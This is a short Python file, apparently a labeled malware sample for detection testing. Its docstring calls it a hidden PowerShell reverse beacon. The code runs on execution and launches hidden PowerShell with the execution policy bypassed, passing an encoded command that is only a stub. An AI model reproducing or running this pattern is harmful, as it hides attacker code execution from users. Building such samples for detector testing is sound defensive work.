"""Malicious: Spawns hidden PowerShell encoded reverse beacon."""
import subprocess

def run_powershell():
    payload = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgA"
    subprocess.Popen(payload, shell=True)

run_powershell()
